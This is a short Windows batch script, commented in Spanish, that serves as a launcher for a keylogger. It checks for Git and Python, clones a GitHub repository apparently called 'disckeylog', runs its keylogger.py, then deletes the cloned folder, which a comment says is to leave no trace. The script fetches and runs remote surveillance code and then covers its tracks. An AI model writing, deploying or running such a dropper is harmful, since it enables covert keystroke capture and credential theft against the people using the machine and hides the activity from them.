@echo off

::check si git esta instalado
:check01
where git > nul 2>&1
if %errorlevel% neq 0 (
    echo "Git is not installed."
    goto gitinstall
    
) else (
    echo "Git is installed."
    goto check02
)
::instala git

:gitinstall
echo "Installing Git..."
start /wait https://git-scm.com/download/win
timeout /t 60
goto check01

:: checkea si python esta instalado
:check02
python --version 3>NUL
if errorlevel 1 goto errorNoPython
goto clone

::Instala python
:errorNoPython
echo Installing Python...
start /wait https://www.python.org/ftp/python/3.9.7/python-3.9.7-amd64.exe
timeout /t 60
goto check02

:: clona el repositorio de github
:clone
git clone https://github.com/Zer0plusOne/disckeylog

::Abre el directorio clonado
cd disckeylog

::Ejecuta el script
python3 keylogger.py

::Timeout
timeout /t 180

::elimina el repositorio para no dejar huella
cd ..
timeout /t 5
rmdir -r disckeylog

